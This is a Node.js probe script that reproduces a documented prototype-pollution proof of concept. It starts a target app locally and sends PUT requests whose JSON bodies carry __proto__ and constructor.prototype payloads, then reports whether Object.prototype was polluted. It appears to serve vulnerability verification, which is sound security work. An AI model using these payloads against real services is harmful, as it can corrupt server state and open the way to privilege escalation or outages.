// Faithful reproduction of the documented PoC:
//   PUT /api/users/1  {"username":{"__proto__":{"pollutedA":true}}}
// Boots the REAL app on an ephemeral 127.0.0.1 port, sends a genuine local
// HTTP request, then checks Object.prototype pollution in-process.
// Usage: node pollute_probe.js <absolute-app-path> <form: proto|ctor>
const http = require('http');

const APP_PATH = process.argv[2];
const FORM = process.argv[3] || 'proto';

const PAYLOADS = {
  // The existing PoC payload form
  proto: '{"username":{"__proto__":{"polluted_proto":true}}}',
  // The constructor.prototype payload form
  ctor:  '{"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}',
};
const MARKER = FORM === 'proto' ? 'polluted_proto' : 'polluted_ctor';
const payload = PAYLOADS[FORM];

const app = require(APP_PATH);
const server = app.listen(0, '127.0.0.1', () => {
  const port = server.address().port;
  const req = http.request(
    {
      host: '127.0.0.1',
      port,
      method: 'PUT',
      path: '/api/users/1',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    },
    (res) => {
      let body = '';
      res.on('data', (d) => (body += d));
      res.on('end', () => {
        const fresh = {};
        const polluted = fresh[MARKER] === true;
        console.log('FORM           :', FORM);
        console.log('payload        :', payload);
        console.log('HTTP status    :', res.statusCode);
        console.log('response body  :', body.slice(0, 200));
        console.log('({})[' + MARKER + '] :', fresh[MARKER]);
        console.log('own marker?    :', Object.prototype.hasOwnProperty.call({}, MARKER));
        console.log('RESULT         :', polluted ? 'POLLUTED' : 'not polluted');
        server.close(() => process.exit(0));
      });
    }
  );
  req.on('error', (e) => {
    console.error('request error', e);
    server.close(() => process.exit(1));
  });
  req.write(payload);
  req.end();
});
